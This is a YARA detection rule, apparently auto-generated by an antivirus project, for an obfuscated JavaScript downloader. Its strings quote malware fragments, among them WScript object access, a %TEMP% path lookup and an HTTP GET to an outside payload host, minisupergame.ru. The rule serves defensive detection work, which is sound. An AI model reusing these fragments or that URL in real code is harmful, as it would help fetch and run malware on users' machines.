rule sig_20160428_a351a6eee82f644d17f970a61459998f {
  meta:
    description = "datamaliciousorder - file 20160428_a351a6eee82f644d17f970a61459998f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fa5125f689e42796b064ce4380eac1a4f4927182064d2e66170b9149838a63c4"

  strings:
    $s1  = "function FaiLifBowIqgPdyIkjCmb(WigNzsJioRneQseEfgRsm){ExuOmtJehHgkSgwNoxXva[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FaiLifBowIqgPdyIkjCmb(WigNzsJioRneQseEfgRsm){ExuOmtJehHgkSgwNoxXva[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KknJuvPnpGsaHwlMfdOrn() {return ExuOmtJehHgkSgwNoxXva[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return GxuOpsLggHrkBzbKobQyc - CtlCsnNqqTyfVhsEucBsf;};" fullword ascii
    $s5  = "var ExuOmtJehHgkSgwNoxXva = function WtkRrpTbgRvyTyiQsgEjc() {return YgdUnhRlwFoqBokUjeJyy[HkpMtnNziPknBszUdeFbn](\"WScript\"+\"" ascii
    $s6  = "function JxwGqfDxtKdcXwuXqdGvq(GxuOpsLggHrkBzbKobQyc, CtlCsnNqqTyfVhsEucBsf){RosTfrPjoLomVstOfhGwy = RosTfrPjoLomVstOfhGwy * 1; " ascii
    $s7  = "var ExuOmtJehHgkSgwNoxXva = function WtkRrpTbgRvyTyiQsgEjc() {return YgdUnhRlwFoqBokUjeJyy[HkpMtnNziPknBszUdeFbn](\"WScript\"+\"" ascii
    $s8  = "var YgdUnhRlwFoqBokUjeJyy = this[\"WScript\"];" fullword ascii
    $s9  = "function KknJuvPnpGsaHwlMfdOrn() {return ExuOmtJehHgkSgwNoxXva[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function OytWyjNlxQmaAuzSozQgk(){return QiwIvlIcmRzxOgyUwbVvv + \"\";};" fullword ascii
    $s11 = "function JxwGqfDxtKdcXwuXqdGvq(GxuOpsLggHrkBzbKobQyc, CtlCsnNqqTyfVhsEucBsf){RosTfrPjoLomVstOfhGwy = RosTfrPjoLomVstOfhGwy * 1; " ascii
    $s12 = "if (KwpWvzHstFxeFcnXjmKrk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function SxtMmtGbaGnfGlcYixPyy() {return ((HfxZepSfxLevYhtHuoYyv == true) && (HfxZepSfxLevYhtHuoYyv == JmgSmkOsrDskVpoNnbLmc)) ?" ascii
    $s14 = "KwpWvzHstFxeFcnXjmKrk[CrlGcaUajAjwTanFxnGjm](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s15 = "function SxtMmtGbaGnfGlcYixPyy() {return ((HfxZepSfxLevYhtHuoYyv == true) && (HfxZepSfxLevYhtHuoYyv == JmgSmkOsrDskVpoNnbLmc)) ?" ascii
    $s16 = "JmgSmkOsrDskVpoNnbLmc = true; " fullword ascii
    $s17 = "function UoiCpcRhrUflHncTfiTgj(AsuCvfYiqPjxByoOyrYxz) {var ByqHtuZguPyfPwrZgvYnl = (1, 2, 3, 4, 5, AsuCvfYiqPjxByoOyrYxz); retur" ascii
    $s18 = "HfxZepSfxLevYhtHuoYyv = true; " fullword ascii
    $s19 = "var JmgSmkOsrDskVpoNnbLmc = false;" fullword ascii
    $s20 = "function QmyGnyQmoFykXkeUqlOsu(){return HkpMtnNziPknBszUdeFbn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}